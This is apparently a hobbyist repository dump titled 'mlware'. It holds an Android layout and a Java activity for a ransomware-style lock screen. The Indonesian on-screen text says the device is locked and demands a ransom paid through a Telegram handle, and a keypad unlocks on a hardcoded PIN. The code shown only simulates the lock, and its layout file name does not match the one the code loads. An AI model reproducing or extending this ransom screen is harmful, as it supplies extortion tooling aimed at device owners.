# mlware
ahahah
main.xml
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical"
    android:gravity="center"
    android:padding="16dp"
    android:background="#B71C1C">

    <TextView
        android:id="@+id/warningText"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="️ Perangkat Anda Telah Terkunci 
Bayar Tebusan Ke t.me/AlwaysGhiff Untuk Membukanya"
        android:textColor="#000000"
        android:textSize="20sp"
        android:padding="8dp"
        android:textStyle="bold" />

    <EditText
        android:id="@+id/inputPin"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:hint="Masukkan Password"
        android:enabled="false"
        android:focusable="false"
        android:gravity="center"
        android:textColor="#FFFFFF"
        android:textSize="18sp"
        android:layout_margin="12dp" />

    <GridLayout
        android:id="@+id/keypad"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:columnCount="3"
        android:rowCount="4"
        android:layout_marginTop="20dp">

        <!-- Tombol angka -->
        <Button android:text="1" android:layout_width="60dp" android:layout_height="60dp" android:layout_margin="6dp"/>
        <Button android:text="2" android:layout_width="60dp" android:layout_height="60dp" android:layout_margin="6dp"/>
        <Button android:text="3" android:layout_width="60dp" android:layout_height="60dp" android:layout_margin="6dp"/>
        <Button android:text="4" android:layout_width="60dp" android:layout_height="60dp" android:layout_margin="6dp"/>
        <Button android:text="5" android:layout_width="60dp" android:layout_height="60dp" android:layout_margin="6dp"/>
        <Button android:text="6" android:layout_width="60dp" android:layout_height="60dp" android:layout_margin="6dp"/>
        <Button android:text="7" android:layout_width="60dp" android:layout_height="60dp" android:layout_margin="6dp"/>
        <Button android:text="8" android:layout_width="60dp" android:layout_height="60dp" android:layout_margin="6dp"/>
        <Button android:text="9" android:layout_width="60dp" android:layout_height="60dp" android:layout_margin="6dp"/>
        <View android:layout_width="60dp" android:layout_height="60dp"/>
        <Button android:text="0" android:layout_width="60dp" android:layout_height="60dp" android:layout_margin="6dp"/>
        <View android:layout_width="60dp" android:layout_height="60dp"/>

    </GridLayout>

</LinearLayout>


mainactivity. java
package com.example.passwordapp;

import android.app.AlertDialog;
import android.content.DialogInterface;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.GridLayout;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {

    private EditText inputPin;
    private String correctPin = "121212"; // PIN default
    private TextView warningText;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        inputPin = findViewById(R.id.inputPin);
        warningText = findViewById(R.id.warningText);

        GridLayout keypad = findViewById(R.id.keypad);

        // Atur tombol keypad
        for (int i = 0; i < keypad.getChildCount(); i++) {
            View child = keypad.getChildAt(i);
            if (child instanceof Button) {
                Button btn = (Button) child;
                btn.setOnClickListener(v -> {
                    inputPin.append(btn.getText().toString());
                    if (inputPin.getText().toString().length() >= correctPin.length()) {
                        checkPin();
                    }
                });
            }
        }
    }

    private void checkPin() {
        if (inputPin.getText().toString().equals(correctPin)) {
            showDialog("Berhasil", "Perangkat berhasil dibuka (simulasi).");
        } else {
            showDialog("Gagal", "PIN salah. Coba lagi!");
            inputPin.setText("");
        }
    }

    private void showDialog(String title, String message) {
        new AlertDialog.Builder(this)
                .setTitle(title)
                .setMessage(message)
                .setPositiveButton("OK", (dialog, which) -> dialog.dismiss())
                .show();
    }
}
